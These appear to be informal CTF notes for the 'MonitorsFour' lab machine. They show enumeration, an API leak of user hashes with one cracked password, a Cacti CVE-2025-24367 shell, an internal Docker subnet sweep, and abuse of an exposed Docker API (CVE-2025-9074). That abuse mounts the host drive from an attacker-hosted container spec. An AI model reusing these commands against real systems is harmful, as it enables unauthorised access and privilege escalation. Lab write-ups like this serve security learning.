## **NMAP SCAN:**
```
nmap -A 10.129.210.82
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-17 03:01 CDT
Nmap scan report for 10.129.210.82
Host is up (0.20s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   199.13 ms 10.10.14.1
2   199.70 ms 10.129.210.82

```
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.46 seconds

Running nginx...
domain: monitorsfour.htb
account: sales@monitorsfour.htb
website has login page 
no dns... not able to scan dir  some error....

## VHOST ENUM

```
> > gobuster vhost --append-domain -u http://monitorsfour.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
> ===============================================================
> Gobuster v3.6
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
> ===============================================================
> [+] Url:             http://monitorsfour.htb/
> [+] Method:          GET
> [+] Threads:         10
> [+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
> [+] User Agent:      gobuster/3.6
> [+] Timeout:         10s
> [+] Append Domain:   true
> ===============================================================
> Starting gobuster in VHOST enumeration mode
> ===============================================================
> Found: cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
> Progress: 4989 / 4990 (99.98%)
> ===============================================================
> Finished
> ===============================================================
```

cacti.monitorsfour.htb vhost found
has a login page.... v 1.2.28 

source code gave CSRF token 
```
var csrfMagicToken='sid:74a517739ab85eb9f757644929d03c8eef551953,1776414027';
```

## CURL SCAN 
gave users and password after api enum 

```
> curl -s "http://monitorsfour.htb/user?token=0"
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},

{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},

{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},

{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}

```

```

> > These are NTLM hash !!!
admin:56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1 (superuser) (system admin) Marcus Higgins

mwatson:69196959c16b26ef00b77d82cf6eb169 (user) (website admin) Michael Watson
janderson:2a22dcf99190c322d974c8df5ba3256b (not useful...)
dthompson:8d4a7e7fd08555133e056d9aacb1e519 (user and db manager) David Thompson
```

maybe we do a nmap scan with more parameters...

```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

winrm available.... not working with username and pass

admin cred worked with cacti

use exploit to get shell on nc 
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py

got a shell and got the user flag !!! 
but not able to upgrade the shell..
found docker and a subnet with ip while curl the docker 
```
www-data@821fbd6a43fa:~/html/cacti$ for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
192.168.65.7:2375 OPEN
```
found the ip where docker is 

the docker  version is vuln to **CVE-2025-9074**


made json file on attacker machine to send it to the target

```
cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF

cd /tmp && python3 -m http.server 8000
```
 
download file: curl http://10.10.14.53:80/container.json -o /tmp/container.json

started the docker: curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=pwned

got container id: 57aca4e1a64cee726fea5e8ec6598e4ad504c6ca24d43f2a8d96f3c5b978ff87


start the container: curl -X POST http://192.168.65.7:2375/containers/57aca4e1a64c/start

then run the log to get root flag: curl http://192.168.65.7:2375/containers/57aca4e1a64c/logs?stdout=true

